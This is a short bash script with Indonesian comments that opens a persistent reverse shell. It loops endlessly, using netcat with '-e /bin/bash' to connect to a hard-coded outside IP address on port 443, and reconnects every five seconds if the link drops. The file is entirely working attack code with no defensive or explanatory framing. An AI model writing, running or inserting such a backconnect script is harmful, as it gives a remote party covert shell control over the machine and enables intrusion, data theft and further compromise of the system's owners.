#!/bin/bash

# IP dan port tujuan
TARGET_IP="145.223.22.151"
TARGET_PORT="443"

# Membuat koneksi backconnect ke IP dan port yang ditentukan menggunakan nc
while true; do
  nc -v $TARGET_IP $TARGET_PORT -e /bin/bash
  # Menunggu beberapa detik sebelum mencoba lagi jika koneksi terputus
  sleep 5
done
